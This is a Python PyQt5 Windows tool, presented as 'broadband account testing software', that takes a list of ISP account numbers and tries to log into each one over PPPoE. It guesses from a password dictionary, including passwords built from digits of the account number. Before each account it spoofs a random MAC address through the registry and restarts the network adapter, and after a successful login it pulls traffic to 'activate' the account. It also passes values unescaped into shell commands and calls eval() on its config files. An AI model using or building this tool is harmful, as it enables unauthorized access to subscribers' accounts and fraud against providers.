
import sys
import time
import logging
import random
import uuid
import csv
import os
import win32ras
import threading
from urllib import request
from PyQt5.QtWidgets import QMainWindow, QAction, qApp, QApplication,\
     QTableView, QFileDialog, QMenuBar, QMenu, QMessageBox, QInputDialog,QLineEdit, QGridLayout ,\
     QWidget,QLabel,QTextEdit,QPushButton ,QDialog, QComboBox, QSpinBox
from PyQt5.QtGui import QIcon, QStandardItemModel, QStandardItem, QClipboard
from PyQt5.QtCore import QThread, QObject, Qt ,QSettings, pyqtSignal

logging.basicConfig(level=logging.NOTSET, format='%(asctime)s - %(filename)s[line:%(lineno)d] - %(levelname)s: %(message)s')


class MySettings(QObject):
    settings_dic = {"interface":"pcie","link_name":"" ,"run_type": "密码字典加随机MAC", "run_mode": "随机时间", \
                    "min_time": "20", "max_time": "50", "min_flow": "100", "max_flow": "1000", "uuid": "", "phone_id": ""}
    settings_pwd = ["123456", "010086", "@1", "@2", "@3", "147258"]
    settings_url = ["www.baidu.com", "www.qq.com"]
    b_down_flag=False
    I_down_size=0.00

    def __init__(self):
        pass

    @staticmethod
    def read_settings():
        f = open('set.txt', 'r')
        a = f.read()
        MySettings.settings_dic = eval(a)
        f.close()

    @staticmethod
    def read_pwd():
        f = open('pwd.txt', 'r')
        a = f.read()
        MySettings.settings_pwd = eval(a)
        f.close()

    @staticmethod
    def read_url():
        f = open('url.txt', 'r')
        a = f.read()
        MySettings.settings_url = eval(a)
        f.close()

    @staticmethod
    def write_settings():
        f = open('set.txt', 'w')
        f.write(str(MySettings.settings_dic))
        f.close()

    @staticmethod
    def write_pwd():
        f = open('pwd.txt', 'w')
        f.write(str(MySettings.settings_pwd))
        f.close()

    @staticmethod
    def write_url():
        f = open('url.txt', 'w')
        f.write(str(MySettings.settings_url))
        f.close()

    @staticmethod
    def read_all_settings():
        try:
            f = open("set.txt", "r")
            f.close()
        except IOError:
            logging.debug("不存在SET.TXT,创建SET.TXT")
            MySettings.write_settings()
        try:
            f = open("pwd.txt", "r")
            f.close()
        except IOError:
            logging.debug("不存在pwd.TXT,创建pwd.TXT")
            MySettings.write_pwd()
        try:
            f = open("url.txt", "r")
            f.close()
        except IOError:
            logging.debug("不存在url.TXT,创建url.TXT")
            MySettings.write_url()
        MySettings.read_settings()
        MySettings.read_pwd()
        MySettings.read_url()

class Communicate(QObject):
    signal_show_status = pyqtSignal(str)
    signal_table_select=pyqtSignal(int)
    signal_table_set_text=pyqtSignal(int,int,str)

        
class MainThread(QThread):
    
    def __init__(self):
        super().__init__()
        self.run_state = True
        self.com=Communicate()
        self.ppoe_name=Example.find_default_ppoename()
        self.qset=Example.findkey_from_interface(MySettings.settings_dic["interface"])
        self.flag_download=False
        if self.ppoe_name =="":
            QMessageBox.about(None, "警告", "PPPOE拨号未创建，请先创建！")
        

    def run(self):
        MySettings.read_all_settings()
        link_name = MySettings.settings_dic["link_name"]
        if Example.isConnected():
            logging.debug("网络已经连接尝试断开默认宽带连接！")
            Example.dis_link_ppoe(self.ppoe_name, 0, 0)
        for x in range(0,Example.model.rowCount()):
            if self.run_state:
                    logging.debug("即将处理第{0}行数据".format(x))
                    Example.chaange_mac_reg(self.qset,Example.new_mac())
                    MySettings.I_down_size=0
                    Example.reboot_net(link_name)
                    time.sleep(1)
                    self.deal_row(x)
                    time.sleep(1)
        QMessageBox.about(None, "提醒", "你已经完成所有账号的测试！")
                    
    def deal_row(self,row):
        self.com.signal_table_select.emit(row)
        if MySettings.settings_dic["run_type"] == "导入密码与MAC":
            phone_id = str(Example.model.item(row,0).text())
            pwd=str(Example.model.item(row,1).text())
            erro_code = Example.link_ppoe(self.ppoe_name, phone_id, pwd)
            Example.model.setItem(row, 1, QStandardItem(erro_code))
            Example.model.setItem(row,2,Example.get_mac_reg(self.qset))
            #设置流量单元格
        else:
            phone_id = str(Example.model.item(row,0).text())
            pwd=""
            logging.debug("进入处理模块，行{0},phone_id为{1}".format(row,phone_id))
            for x in range(0,len(MySettings.settings_pwd)):
                pwd=MySettings.settings_pwd[x]
                if(pwd == "@1"):
                    pwd = phone_id[:6]
                if(pwd == "@2"):
                    pwd = phone_id[-6:]
                if(pwd == "@3"):
                    pwd = phone_id[:3]+phone_id[-3:]
                logging.debug("账号为：{0},尝试拨号第{1}个密码，密码为：{2}".format(phone_id,x,pwd))
                erro_code = Example.link_ppoe(self.ppoe_name, phone_id, pwd)
                logging.debug("账号为：{0},尝试拨号第{1}个密码，密码为：{2};错误码为{3}".format(phone_id,x,pwd,erro_code))
                self.com.signal_table_set_text.emit(row,x+1,str(erro_code))
                if erro_code == 0:
                    if MySettings.settings_dic["run_mode"] =="随机时间":
                        self.down_load_time()
                    if MySettings.settings_dic["run_mode"] =="随机流量":
                        self.down_load_flow()
                    Example.dis_link_ppoe(self.ppoe_name, phone_id, pwd)
                    break
            logging.debug("UI界面显示MAC地址")
            self.com.signal_table_set_text.emit(row,len(MySettings.settings_pwd)+1,Example.get_mac_reg(self.qset))
            logging.debug("UI界面显示下载流量")
            self.com.signal_table_set_text.emit(row,len(MySettings.settings_pwd)+2,str(round(MySettings.I_down_size/1024/1024,2))+"MB")
    def stop_down_load(self):
        MySettings.b_down_flag=False
                
    def down_load_time(self):
        logging.debug("进入随机时间下载模式")
        ran_time=random.randint(int(MySettings.settings_dic["min_time"]),int(MySettings.settings_dic["max_time"]))
        logging.debug("获取随机时间为{0}秒".format(ran_time))
        timer = threading.Timer(ran_time, self.stop_down_load)
        timer.start()
        logging.debug("启动定时器")
        MySettings.b_down_flag = True
        MySettings.I_down_size = 0
        while MySettings.b_down_flag:
            url=random.choice(MySettings.settings_url)
            logging.debug("准备下载{0}".format(url))
            try:
                request.urlretrieve(url,"C:\\wanghai.",Example.callbackfunc)
            except Exception as e:
                logging.debug("下载{0}错误，{1}".format(url,e))
            logging.debug("下载结束{0}".format(url))
        
    def down_load_flow(self):
        pass    
            

class ui_settings(QDialog):
    def __init__(self):
        super().__init__()
        self.link,self.interface=Example.get_network_info()
        self.setWindowTitle("参数设置")
        self.setGeometry(0, 0, 200, 300)
        self.mygrid = QGridLayout();
        self.setLayout(self.mygrid)
        MySettings.read_all_settings()
        self.lable_interface = QLabel("网卡连接名：")
        self.comb_interface=QComboBox()
        y = 0
        for x in range(len(self.interface)):
            if self.interface[x] == MySettings.settings_dic["interface"]:
                y = x
            self.comb_interface.addItem(self.interface[x])
        self.comb_interface.setCurrentIndex(y)

        y = 0
        self.lable_runtype = QLabel("运行模式：")
        run_type=["密码字典加随机MAC","密码字典加导入MAC","导入密码与MAC"]
        y = run_type.index(MySettings.settings_dic["run_type"])
        self.comb_runtype=QComboBox()
        self.comb_runtype.addItems(run_type)
        self.comb_runtype.setCurrentIndex(y)

        y = 0
        self.lable_runmode = QLabel("随机模式：")
        run_mode = ["随机时间", "随机流量"]
        y = run_mode.index(MySettings.settings_dic["run_mode"])
        self.comb_runtmode = QComboBox()
        self.comb_runtmode.addItems(run_mode)
        self.comb_runtmode.setCurrentIndex(y)

        self.lable_min_time = QLabel("最小时间秒：")
        self.spin_min_time=QSpinBox()
        self.spin_min_time.setValue(int(MySettings.settings_dic["min_time"]))
        self.spin_min_time.setRange(20,999999999)
        self.lable_max_time = QLabel("最大时间秒：")
        self.spin_max_time = QSpinBox()
        self.spin_max_time.setRange(20,999999999)
        self.spin_max_time.setValue(int(MySettings.settings_dic["max_time"]))
        self.lable_min_flow = QLabel("最小流量兆：")
        self.spin_min_flow=QSpinBox()
        self.spin_min_flow.setRange(20,999999999)
        self.spin_min_flow.setValue(int(MySettings.settings_dic["min_flow"]))
        self.lable_max_flow = QLabel("最大流量兆：")
        self.spin_max_flow = QSpinBox()
        self.spin_max_flow.setRange(20,999999999)
        self.spin_max_flow.setValue(int(MySettings.settings_dic["max_flow"]))
        self.pb_submit = QPushButton("提交")
        self.mygrid.addWidget(self.lable_interface, 0, 0, 1, 1)
        self.mygrid.addWidget(self.comb_interface, 0, 1, 1, 1)
        self.mygrid.addWidget(self.lable_runtype, 1, 0, 1, 1)
        self.mygrid.addWidget(self.comb_runtype, 1, 1, 1, 1)
        self.mygrid.addWidget(self.lable_runmode, 2, 0, 1, 1)
        self.mygrid.addWidget(self.comb_runtmode, 2, 1, 1, 1)
        self.mygrid.addWidget(self.lable_min_time, 3, 0, 1, 1)
        self.mygrid.addWidget(self.spin_min_time, 3, 1, 1, 1)
        self.mygrid.addWidget(self.lable_max_time, 4, 0, 1, 1)
        self.mygrid.addWidget(self.spin_max_time, 4, 1, 1, 1)
        self.mygrid.addWidget(self.lable_min_flow, 5, 0, 1, 1)
        self.mygrid.addWidget(self.spin_min_flow, 5, 1, 1, 1)
        self.mygrid.addWidget(self.lable_max_flow, 6, 0, 1, 1)
        self.mygrid.addWidget(self.spin_max_flow, 6, 1, 1, 1)
        self.mygrid.addWidget(self.pb_submit, 7, 0, 1, 2)
        self.pb_submit.clicked.connect(self.save_settings)

    def save_settings(self):
        if self.spin_max_time.value() <= self.spin_min_time.value():
            QMessageBox.about(None, "警告", "最大时间必须比最小时间大！")
            return
        if self.spin_max_flow.value() <= self.spin_min_flow.value():
            QMessageBox.about(None, "警告", "最大流量必须比最小流量大！")
            return
        MySettings.settings_dic["interface"] = self.comb_interface.currentText()
        MySettings.settings_dic["link_name"]=self.link[self.interface.index(self.comb_interface.currentText())]
        MySettings.settings_dic["run_mode"] = self.comb_runtmode.currentText()
        MySettings.settings_dic["run_type"] = self.comb_runtype.currentText()
        MySettings.settings_dic["min_time"] = self.spin_min_time.value()
        MySettings.settings_dic["max_time"] = self.spin_max_time.value()
        MySettings.settings_dic["min_flow"] = self.spin_min_flow.value()
        MySettings.settings_dic["max_flow"] = self.spin_max_flow.value()
        MySettings.write_settings()
        self.close()

class Example(QMainWindow):
    model= QStandardItemModel()
    def __init__(self):
        super().__init__()
        self.my_tableview = QTableView(self)
        self.init_ui()
        MySettings.read_all_settings()
        self.mythread = MainThread()
        self.mythread.com.signal_show_status.connect(self.show_status)
        self.mythread.com.signal_table_select.connect(self.table_select)
        self.mythread.com.signal_table_set_text.connect(self.table_set_text)

    def init_ui(self):
        action_set_option = QAction("参数设置", self)
        action_set_option.triggered.connect(self.set_option)
        action_set_url = QAction("URL设置", self)
        action_set_url.triggered.connect(self.set_url)
        action_set_pwd = QAction("密码设置", self)
        action_set_pwd.triggered.connect(self.set_pwd)
        action_import_data = QAction("导入数据", self)
        action_import_data.triggered.connect(self.import_data)
        action_act_start = QAction("开始激活", self)
        action_act_start.triggered.connect(self.act_start)
        action_act_stop = QAction("停止激活", self)
        action_act_stop.triggered.connect(self.act_stop)
        action_export_data = QAction("导出数据", self)
        action_export_data.triggered.connect(self.export_data)
        action_id_au = QAction("认证", self)
        action_id_au.triggered.connect(self.id_au)
        action_create_mac = QAction("生成MAC", self)
        action_create_mac.triggered.connect(Example.create_mac)
        action_buy = QAction("购买", self)
        action_buy.triggered.connect(self.buy)
        action_about = QAction("关于", self)
        action_about.triggered.connect(self.about)
        action_urltest = QAction("下载链接测试", self)
        action_urltest.triggered.connect(self.urltest)
        self.ui_set=ui_settings()
        self.statusBar().addPermanentWidget(QLabel(self)); 

        # 创建一个菜单栏
        menubar = self.menuBar()
        # 添加参数设置菜单
        file_menu = menubar.addMenu('&设置')
        # 参数设置餐单添加事件
        file_menu.addAction(action_set_option)
        file_menu.addAction(action_set_pwd)
        file_menu.addAction(action_set_url)
        # 主菜单添加事件
        menubar.addAction(action_import_data);
        menubar.addAction(action_act_start);
        menubar.addAction(action_act_stop);
        menubar.addAction(action_export_data);
        menubar.addAction(action_id_au);
        other = menubar.addMenu('&其他')
        other.addAction(action_create_mac)
        other.addAction(action_buy)
        other.addAction(action_urltest)
        other.addAction(action_about)
        self.my_tableview.setModel(self.model)
        self.setCentralWidget(self.my_tableview)
        self.setGeometry(30, 30, 700, 500)
        self.setWindowTitle('宽带账号测试软件')
        self.show()

    def set_option(self):
        """设置参数界面"""
        print("set_option")
        self.ui_set.move(self.geometry().x(),self.geometry().y())
        self.ui_set.exec()

    def set_url(self):
        url_str = ""
        for x in MySettings.settings_url:
            url_str = url_str+x+"\n"
        url_save,ok = QInputDialog.getMultiLineText(self, "输入URL,每行一个", "URL", url_str)
        if ok:
            MySettings.settings_url = str(url_save).split("\n")[:-1]
            MySettings.write_url()
            logging.debug("写入URL成功")


    def set_pwd(self):
        pwd_str = ""
        for x in MySettings.settings_pwd:
            pwd_str = pwd_str+x+"\n"
        pwd_save,ok = QInputDialog.getMultiLineText(self, "输入URL,每行一个", "URL", pwd_str)
        if ok:
            MySettings.settings_pwd = str(pwd_save).split("\n")[:-1]
            MySettings.write_pwd()
            logging.debug("写入密码成功")

    # 导入数据事件
    def import_data(self):
        logging.debug("读取参数配置文件")
        MySettings.read_settings()
        logging.debug("运行类型为:"+MySettings.settings_dic["run_type"])
        if self.model.rowCount() > 0:
            self.model.clear()
        file_path = QFileDialog.getOpenFileName(None, "选择账号文件", ".", "*.csv")
        if file_path[0] == "":
            return
        if MySettings.settings_dic["run_type"] == "密码字典加随机MAC" or MySettings.settings_dic["run_type"] == "密码字典加导入MAC":
            self.model.setColumnCount(len(MySettings.settings_pwd)+3)
            self.model.setHeaderData(0, Qt.Horizontal, "帐号")
            for x in range(1, len(MySettings.settings_pwd)+1):
                self.model.setHeaderData(x, Qt.Horizontal, "密码"+MySettings.settings_pwd[x-1])
            self.model.setHeaderData(len(MySettings.settings_pwd) + 1, Qt.Horizontal, "MAC")
            self.model.setHeaderData(len(MySettings.settings_pwd) + 2, Qt.Horizontal, "流量")
        if MySettings.settings_dic["run_type"] == "导入密码与MAC":
            self.model.setColumnCount(4)
            self.model.setHeaderData(0, Qt.Horizontal, "帐号")
            self.model.setHeaderData(1, Qt.Horizontal, "密码")
            self.model.setHeaderData(3, Qt.Horizontal, "MAC")
            self.model.setHeaderData(4, Qt.Horizontal, "流量")
        csv_reader = csv.reader(open(file_path[0], encoding='utf-8'))
        i = 0
        for row in csv_reader:
            if i != 0:
                try:
                    self.model.setItem(i - 1, 0, QStandardItem(row[0]))
                    if MySettings.settings_dic["run_type"] == "密码字典加随机MAC":
                        self.model.setItem(i - 1, len(MySettings.settings_pwd)+1, QStandardItem(self.new_mac()))
                    if MySettings.settings_dic["run_type"] == "密码字典加导入MAC":
                        self.model.setItem(i-1, len(MySettings.settings_pwd)+1, QStandardItem(row[1]))
                    if MySettings.settings_dic["run_type"] == "导入密码与MAC":
                        self.model.setItem(i-1, 1, QStandardItem(row[1]))
                        self.model.setItem(i-1, 2, QStandardItem(row[2]))
                except Exception:
                    logging.debug("导入数据格式有误，请按导入模板导入！")
                    QMessageBox.about(None, "提醒", "导入数据格式有误，请按导入模板导入！")
                    break

            i += 1

    def act_start(self):
        if not self.mythread.isRunning():
            logging.debug("激活线程开启，启动线程")
            self.mythread.start()
            self.mythread.run_state = True
        else:
            logging.debug("激活线程已经开启，设置运行状态为运行")
            self.mythread.run_state = True

    def act_stop(self):
        logging.debug("设置运行状态为停止")
        self.mythread.run_state = False

    def export_data(self):
        logging.debug("执行导出事件")
        #out = open(outfile, 'w', newline='')
        #csv_writer = csv.writer(out, dialect='excel')
        #csv_writer.writerow(list)

    def id_au(self):
        print("id_au")
        
    @staticmethod
    def create_mac():
        """
        生成1000个随机MAC地址
        :return: BOOL
        """
        logging.debug("进入生成事件")
        with open("mac.txt", "w") as f:  # 格式化字符串还能这么用！
            for x in range(1000):
                    f.write(Example.new_mac()+"\n")

    def get_user_id(self):
        MySettings.read_settings()
        if MySettings.settings_dic["uuid"] == "":
            MySettings.settings_dic["uuid"] = str(uuid.uuid1())
        if MySettings.settings_dic["phone_id"] == "":
                MySettings.settings_dic["phone_id"] = QInputDialog.getText(self, "请输入手机号", "手机号:", QLineEdit.Normal, "15007077632")[0]
        MySettings.write_settings()
        return MySettings.settings_dic["uuid"], MySettings.settings_dic["phone_id"]

    def buy(self):
        logging.debug("进入购买事件,生成购买码")
        user_id =self.get_user_id()
        logging.debug(user_id)
        bord = QApplication.clipboard()
        bord.setText(str(user_id))
        QMessageBox.about(None, "提醒", str(user_id)+"\n拍照截图给作者,或者直接粘贴到文本CTR+V,因为内容已经复制到剪切板")

    @staticmethod
    def callbackfunc(blocknum, blocksize, totalsize):
        '''回调函数
        @blocknum: 已经下载的数据块
        @blocksize: 数据块的大小
        @totalsize: 远程文件的大小
        '''
        if MySettings.b_down_flag == False:
            logging.debug("当前下载时间到，退出")
            MySettings.I_down_size=MySettings.I_down_size + (blocknum * blocksize)
            os._exit()
        percent = 100.0 * blocknum * blocksize / totalsize
        if percent > 100:
            percent = 100
        if percent ==100:
            MySettings.I_down_size += totalsize
        print("%.2f%%" % percent)



    def urltest(self):
        logging.debug("进入下载测试事件")
        str=""
        for x in MySettings.settings_url:
            logging.debug("开始下载文件：{0}".format(x))
            try:
                r = request.urlopen(x,timeout=2)
            except Exception as e:
                str =str+"网址:{0}\n状态:{1}\n错误:{2}\n\n".format(x,"失败",e)
                logging.debug("下载地址无效：{0},ERRO:{1}".format(x,e))
                break
            if r.headers["Content-Type"] == "application/octet-stream":
                logging.debug("成功下载文件：{0},大小为:{1}MB".format(x,round(float(r.headers["Content-Length"])/1024/1024),2))
                str =str+"网址:{0}\n状态:{1}\n大小:{2}MB\n\n".format(x,"成功",round(float(r.headers["Content-Length"])/1024/1024,2))
            else:
                logging.debug("下载地址无效：{0},ERRO:{1}".format(x,"下载地址非二进制文件!"))
                str =str+"网址:{0}\n状态:{1}\n错误:{2}\n\n".format(x,"失败","下载地址非二进制文件!")
        pwd_save,ok = QInputDialog.getMultiLineText(self, "URL测试报告", "URL", str)

    def about(self):
        logging.debug("进入关于事件")
        url = 'http://dldir1.qq.com/weixin/Windows/WeChatSetup.exe'
        local = 'd:\\WeChatSetup.exe'
        request.urlretrieve(url,local,Example.callbackfunc)
    
    def show_status(self,msg):
        self.statusBar().showMessage(msg)
    
    def table_select(self,row):
        logging.debug("TABLEVIEW选择行{0}".format(row))
        self.my_tableview.selectRow(row)
    def table_set_text(self,row,col,text):
        Example.model.setItem(row, col, QStandardItem(text))

    @staticmethod
    def new_mac():
        """
        生成一个标准MAC地址字符串
        :return: 字符串
        """
        data1 = ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F')
        data2 = ('2', '6', 'A')
        mac = ""
        mac = mac + random.choice(data1)
        mac = mac + random.choice(data2)
        for i in range(10):
            mac += random.choice(data1)
        return mac

    @staticmethod
    def find_default_ppoename():
        try:
            ppoe = win32ras.EnumEntries()[0]
        except Exception as e:
            ppoe = ""
            logging.debug(e)
        return ppoe

    @staticmethod
    def reboot_net(link_name):
        cmd_str_dis = "netsh interface set interface \"{0}\" disabled ".format(link_name)
        cmd_str_en = "netsh interface set interface \"{0}\" enable ".format(link_name)
        disable_net = os.system(cmd_str_dis)
        if str(disable_net) == "0":
            logging.debug("禁用网卡{0}成功{1}".format(link_name,disable_net))
        else:
            logging.debug("禁用网卡{0}失败{1}".format(link_name,disable_net))
        time.sleep(2)
        enable_net=os.system(cmd_str_en)
        if str(enable_net) == "0":
            logging.debug("启用网卡{0}成功{1}".format(link_name,enable_net))
        else:
            logging.debug("启用网卡{0}失败{1}".format(link_name,enable_net))
        time.sleep(5)    
    @staticmethod
    def chaange_mac_reg(qset , new_mac):
        """
        设置新的MAC地址
        :param qset: QSettings 网卡注册表地址
        :param new_mac: MAC地址
        :return: 无
        """
        qset.setValue("NetworkAddress", new_mac)
        
    @staticmethod
    def get_mac_reg(qset):
        """
        获取MAC地址
        :param qset: QSettings 网卡注册表地址
        :return: str MAC地址
        """
        return str(qset.value("NetworkAddress"))
    @staticmethod
    def findkey_from_interface(interface_name):
        """
        通过网络接口名字查找注册表位置
        :param interface_name:string 网络接口
        :return:QSettings 注册表对象
        """
        logging.debug("查找接口名为{0}的注册表对象".format(interface_name))
        #key_str="HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002bE10318}"
        key_str = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002bE10318}"
        key = QSettings(key_str, QSettings.NativeFormat)
        dev_reg = None
        for x in key.childGroups():
            key_str2 = key_str+"\\"+x
            key2 = QSettings(key_str2, QSettings.NativeFormat)
            if key2.value("DriverDesc", "-1") == interface_name:
                dev_reg = key2
                logging.debug("成功查找到{0}的注册表对象\n地址为:{1}".format(interface_name, dev_reg.fileName()))
        return dev_reg

    @staticmethod
    def get_network_info():
        """
        获取网卡信息
        :return: list,list
        """
        logging.debug("获取网卡信息")
        ipconfig_result_list = os.popen('ipconfig /all').readlines()  # 执行cmd命令ipconfig，并将结果存于ipconfig_result_list
        link_name=[]
        interface_name=[]
        for i in range(0, len(ipconfig_result_list)):  # 逐行查找
            if str(ipconfig_result_list[i]).find("适配器") != -1:
                link_name.append(str(ipconfig_result_list[i]).split(" ")[1].strip().strip(':'))
            if str(ipconfig_result_list[i]).find("Ethernet adapter") != -1:
                link_name.append(str(ipconfig_result_list[i]).split(" ")[2].strip().strip(':'))
            if str(ipconfig_result_list[i]).find("描述") != -1:
                interface_name.append(str(ipconfig_result_list[i]).split(":")[1].strip().strip(':'))
            if str(ipconfig_result_list[i]).find("Description") != -1:
                interface_name.append(str(ipconfig_result_list[i]).split(":")[1].strip().strip(':'))
        #print(link_name, interface_name)
        return  link_name, interface_name
    @staticmethod
    def isConnected():
        try:
            html = request.urlopen("http://www.baidu.com",timeout=2)
        except:
            return False
        return True
    @staticmethod
    def link_ppoe(ppoe_name,phone,pwd):
        cmd_str="rasdial \"{0}\" {1} {2}".format(ppoe_name,phone,pwd)
        logging.debug(cmd_str)
        return os.system(cmd_str)
    
    @staticmethod
    def dis_link_ppoe(ppoe_name,phone,pwd):
        cmd_str="rasdial \"{0}\" /disconnect".format(ppoe_name)
        logging.debug(cmd_str)
        return os.system(cmd_str)
    
if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = Example()
    sys.exit(app.exec_())
